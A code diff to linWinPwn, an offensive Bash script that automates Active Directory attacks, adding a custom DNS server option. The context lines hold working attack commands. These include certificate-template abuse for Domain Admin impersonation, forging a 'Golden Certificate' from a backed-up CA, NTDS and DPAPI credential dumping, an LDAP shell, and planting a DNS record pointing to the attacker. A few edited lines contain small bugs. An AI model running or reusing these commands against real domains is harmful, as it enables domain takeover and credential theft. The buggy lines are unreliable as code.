@@ -150,7 +150,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.2.2 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.2.3 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -178,6 +178,7 @@ help_linWinPwn() {
     echo -e "--ldaps             Use LDAPS instead of LDAP (port 636)"
     echo -e "--ldap-bind-sign    Use LDAP Channel Binding (LDAPS) / LDAP Signing (LDAP)"
     echo -e "--force-kerb        Use Kerberos authentication instead of NTLM when possible (requires password or NTLM hash)"
+    echo -e "--dns-ip            Use Custom IP for DNS (instead of the DomainController)"
     echo -e "--dns-tcp           Use TCP protocol for DNS (when possible)"
     echo -e "--verbose           Enable all verbose and debug outputs"
     echo -e "-I/--interface      Attacker's network interface (default: eth0)"
@@ -197,6 +198,7 @@ while test $# -gt 0; do
     case $1 in
     -t | --target)
         dc_ip="${2}"
+        dns_ip=${dc_ip}
         shift
         ;; #mandatory
     -d | --domain)
@@ -290,6 +292,10 @@ while test $# -gt 0; do
         forcekerb_bool=true
         args+=("$1")
         ;;
+    --dns-ip)
+        dns_ip="${2}"
+        shift
+        ;;
     --dns-tcp)
         dnstcp_bool=true
         args+=("$1")
@@ -347,7 +353,7 @@ etc_resolv_update() {
         resolv_bak="${Config_dir}/resolv.conf.$(date +%Y%m%d%H%M%S).backup"
         sudo cp /etc/resolv.conf "${resolv_bak}"
         echo -e "${YELLOW}[i] Backup file of /etc/resolv.conf created: ${resolv_bak}${NC}"
-        sed "1s/^/\# \/etc\/resolv.conf entry added by linWinPwn\nnameserver ${dc_ip}\n/" /etc/resolv.conf | sudo tee /etc/resolv.conf
+        sed "1s/^/\# \/etc\/resolv.conf entry added by linWinPwn\nnameserver ${dns_ip}\n/" /etc/resolv.conf | sudo tee /etc/resolv.conf
         echo -e "${GREEN}[+] DNS resolv config update complete${NC}"
     else
         echo -e "${PURPLE}[-] Target IP already present in /etc/resolv.conf... ${NC}"
@@ -961,7 +967,7 @@ dns_enum() {
             else
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
                 if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
-                run_command "${adidnsdump} ${argument_adidns} ${ldaps_param} ${dnstcp_param} ${dc_ip}" | tee "${Servers_dir}/adidnsdump_output_${dc_domain}.txt"
+                run_command "${adidnsdump} ${argument_adidns} ${ldaps_param} ${dnstcp_param} ${dns_ip}" | tee "${Servers_dir}/adidnsdump_output_${dc_domain}.txt"
                 if [ -s "records.csv" ]; then
                     mv records.csv "${Servers_dir}/dns_records_${dc_domain}.csv"
                     grep "A," "${Servers_dir}/dns_records_${dc_domain}.csv" | grep -v "DnsZones\|@" | cut -d "," -f 2 | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" >"${Servers_dir}/servers_list_dns_${dc_domain}.txt"
@@ -1281,9 +1287,9 @@ bhd_enum() {
             if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param="--ldap-channel-binding"; else ldapbindsign_param=""; fi
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps ${ldapbindsign_param}"; else ldaps_param=""; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
-            run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN} ${ldaps_param}" | tee "${DomainRecon_dir}/BloodHound_${user_var}/bloodhound_output_${dc_domain}.txt"
+            run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN} ${ldaps_param}" | tee "${DomainRecon_dir}/BloodHound_${user_var}/bloodhound_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
-            #run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${ne_kerb} ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c All --log ${DomainRecon_dir}/BloodHound_${user_var}/ne_bloodhound_output_${dc_domain}.txt" 2>&1
+            #run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${ne_kerb} ${target} ${argument_ne} --bloodhound --dns-server ${dns_ip} -c All --log ${DomainRecon_dir}/BloodHound_${user_var}/ne_bloodhound_output_${dc_domain}.txt" 2>&1
             /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhd_${user_var}.txt"
             /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhd_${user_var}.txt"
             /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHound"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhd_${user_var}.txt"
@@ -1316,9 +1322,9 @@ bhd_enum_dconly() {
             if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param="--ldap-channel-binding"; else ldapbindsign_param=""; fi
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps ${ldapbindsign_param}"; else ldaps_param=""; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
-            run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN} ${ldaps_param}" | tee "${DomainRecon_dir}/BloodHound_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
+            run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN} ${ldaps_param}" | tee "${DomainRecon_dir}/BloodHound_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
             cd "${current_dir}" || exit
-            #run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c DCOnly --log tee ${DomainRecon_dir}/BloodHound_${user_var}/ne_bloodhound_output_${dc_domain}.txt" 2>&1
+            #run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --bloodhound --dns-server ${dns_ip} -c DCOnly --log tee ${DomainRecon_dir}/BloodHound_${user_var}/ne_bloodhound_output_${dc_domain}.txt" 2>&1
             /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhd_${user_var}.txt"
             /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhd_${user_var}.txt"
             /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHound"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhd_${user_var}.txt"
@@ -1349,7 +1355,7 @@ bhdce_enum() {
             current_dir=$(pwd)
             cd "${DomainRecon_dir}/BloodHoundCE_${user_var}" || exit
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
-            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_${dc_domain}.txt"
+            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
             /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhdce_${user_var}.txt"
             /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhdce_${user_var}.txt"
@@ -1381,7 +1387,7 @@ bhdce_enum_dconly() {
             current_dir=$(pwd)
             cd "${DomainRecon_dir}/BloodHoundCE_${user_var}" || exit
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
-            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
+            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
             cd "${current_dir}" || exit
             /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhdce_${user_out}_${dc_domain}.txt"
             /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhdce_${user_out}_${dc_domain}.txt"
@@ -1613,7 +1619,7 @@ bloodyad_dnsquery() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] bloodyad dump DNS entries${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get dnsDump" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_dns_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns {$dns_ip} get dnsDump" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_dns_${dc_domain}.txt"
             echo -e "${YELLOW}If ADIDNS does not contain a wildcard entry, check for ADIDNS spoofing${NC}"
             sed -n '/[^\n]*\*/,/^$/p' "${DomainRecon_dir}/bloodyAD/bloodyad_dns_${dc_domain}.txt"
             grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "${DomainRecon_dir}/bloodyAD/bloodyad_dns_${dc_domain}.txt" > "${Servers_dir}/ip_list_bdyad_${dc_domain}.txt"
@@ -2117,8 +2123,8 @@ certipy_enum() {
                 if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
             fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -stdout" >"${ADCS_dir}/certipy_output_${user_var}.txt"
-            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a "${ADCS_dir}/certipy_vulnerable_output_${user_var}.txt"
+            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -stdout" >"${ADCS_dir}/certipy_output_${user_var}.txt"
+            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a "${ADCS_dir}/certipy_vulnerable_output_${user_var}.txt"
             cd "${current_dir}" || exit
         fi
     fi
@@ -2141,7 +2147,7 @@ adcs_vuln_parse() {
         for vulntemp in $esc1_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn < Domain Admin >@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn < Domain Admin >@${dc_domain} -dns ${dns_ip} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}2. Authenticate using pfx of Domain Admin or DC:${NC}"
             echo -e "${certipy} auth -pfx < Domain Admin_Domain Controller >.pfx -dc-ip ${dc_ip} -sid < ${sid_domain}-500 >"
         done
@@ -2169,7 +2175,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
             echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}2. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn < Domain Admin >@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn < Domain Admin >@${dc_domain} -dns ${dns_ip} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
             echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}4. Authenticate using pfx of Domain Admin or DC:${NC}"
@@ -2348,7 +2354,7 @@ certifried_check() {
                     if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
                 fi
                 if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096" 2>&1 | tee "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"
+                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096" 2>&1 | tee "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"
                 if ! grep -q "Certificate object SID is" "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt" && ! grep -q "error" "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"; then
                     echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
@@ -2375,7 +2381,7 @@ certipy_ldapshell() {
             echo -e "${BLUE}[*] Launching LDAP shell via Schannel using Certipy ${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} ${ldaps_param} -ldap-shell" 2>&1 | tee "${ADCS_dir}/certipy_ldapshell_output_${user_var}.txt"
+            run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} -ldap-shell" 2>&1 | tee "${ADCS_dir}/certipy_ldapshell_output_${user_var}.txt"
         else
             echo -e "${PURPLE}[-] Certificate authentication required to open LDAP shell using Certipy${NC}"
         fi
@@ -2407,7 +2413,7 @@ certipy_ca_dump() {
                 i=$((i + 1))
                 pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                 if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-                run_command "${certipy} ca ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} -target ${pki_server} -backup ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/certipy_ca_backup_output_${user_var}.txt"
+                run_command "${certipy} ca ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} -target ${pki_server} -backup ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/certipy_ca_backup_output_${user_var}.txt"
                 run_command "${certipy} forge -ca-pfx ${Credentials_dir}/${pki_ca//SPACE/_}.pfx -upn Administrator@${dc_domain} -subject CN=Administrator,CN=Users,$domain_DN -out Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx" | tee -a "${ADCS_dir}/certipy_forge_output_${user_var}.txt"
                 if stat "${Credentials_dir}/Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx" >/dev/null 2>&1; then
                     echo -e "${GREEN}[+] Golden Certificate successfully generated!${NC}"
@@ -2455,7 +2461,7 @@ certsync_ntds_dump() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${certsync} ${argument_certsync} -dc-ip ${dc_ip} ${dnstcp_bool} -ns ${dc_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${Credentials_dir}/certsync_${user_var}.txt"
+            run_command "${certsync} ${argument_certsync} -dc-ip ${dc_ip} ${dnstcp_bool} -ns ${dns_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${Credentials_dir}/certsync_${user_var}.txt"
         fi
     fi
     echo -e ""
@@ -3485,14 +3491,14 @@ mssql_relay_check() {
             echo -e "${BLUE}[*] MSSQL Relay Check${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${dnstcp_param} ${argument_mssqlrelay} -ns ${dc_ip} -windows-auth" | tee "${MSSQL_dir}/mssql_relay_checkall_output_${user_var}.txt" 2>&1
+            run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${dnstcp_param} ${argument_mssqlrelay} -ns ${dns_ip} -windows-auth" | tee "${MSSQL_dir}/mssql_relay_checkall_output_${user_var}.txt" 2>&1
             sql_mssqlrelay="${MSSQL_dir}/mssql_relay_instances_${user_var}.txt"
             if [ -s "${MSSQL_dir}/mssql_relay_checkall_output_${user_var}.txt" ]; then
                 grep -i "MSSQLSvc" "${MSSQL_dir}/mssql_relay_checkall_output_${user_var}.txt" | awk -F'[/:)]+' '$3 ~ /^[0-9]+$/ {print $2 " -mssql-port " $3}' | sort -u >> "${sql_mssqlrelay}"
             fi
             if stat "${sql_mssqlrelay}" >/dev/null 2>&1; then
                 for i in $(/bin/cat "${sql_mssqlrelay}"); do
-                    echo "${mssqlrelay} ${mssqlrelay_verbose} check ${ldaps_param} ${dnstcp_param} ${argument_mssqlrelay} -ns ${dc_ip} -windows-auth -target $i" > "${MSSQL_dir}/mssql_relay_check_run_${user_var}.sh" 2>&1
+                    echo "${mssqlrelay} ${mssqlrelay_verbose} check ${ldaps_param} ${dnstcp_param} ${argument_mssqlrelay} -ns ${dns_ip} -windows-auth -target $i" > "${MSSQL_dir}/mssql_relay_check_run_${user_var}.sh" 2>&1
                 done
             fi
         fi
@@ -3681,7 +3687,7 @@ dnsentry_add() {
             echo -e "${BLUE}[*] Please confirm the IP of the attacker's machine:${NC}"
             set_attackerIP
             echo -e "${BLUE}[*] Adding new DNS entry for Active Directory integrated DNS${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add dnsRecord ${hostname_dnstool} ${attacker_IP}" | tee -a "${Modification_dir}//bloodyAD_${user_var}/bloodyad_dns_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord ${hostname_dnstool} ${attacker_IP}" | tee -a "${Modification_dir}//bloodyAD_${user_var}/bloodyad_dns_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4407,7 +4413,7 @@ hekatomb_dump() {
         else
             current_dir=$(pwd)
             cd "${Credentials_dir}" || exit
-            run_command "${hekatomb} ${argument_hekatomb}\\@${dc_ip} -dns ${dc_ip} -smb2 -csv" | tee "${Credentials_dir}/hekatomb_${user_var}.txt"
+            run_command "${hekatomb} ${argument_hekatomb}\\@${dc_ip} -dns ${dns_ip} -smb2 -csv" | tee "${Credentials_dir}/hekatomb_${user_var}.txt"
             cd "${current_dir}" || exit
         fi
     fi
